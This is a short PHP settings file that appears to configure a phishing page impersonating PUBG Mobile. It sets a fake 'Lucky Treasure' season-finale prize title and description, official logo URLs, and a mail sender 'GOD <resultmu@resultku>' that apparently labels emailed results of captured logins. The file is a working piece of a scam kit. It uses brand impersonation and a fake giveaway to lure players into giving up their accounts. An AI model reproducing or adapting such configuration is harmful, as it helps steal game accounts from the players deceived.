<?php
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');

$title = 'PUBG MOBILE S16 X METRO EXODUS - Lucky Treasure';
$description = 'The last week of the season is over. Come join the Royale Pass 16 season finale here. Get a variety of legendary prizes and more!';
$copyright = 'PUBG MOBILE';
$theme = '#f2aa00';
$image = 'http://www.pubgmobile.com/common/images/icon_logo.jpg';
$icon = 'http://www.pubgmobile.com/common/images/icon_logo.jpg';
$sender = 'From: GOD <resultmu@resultku>';
?>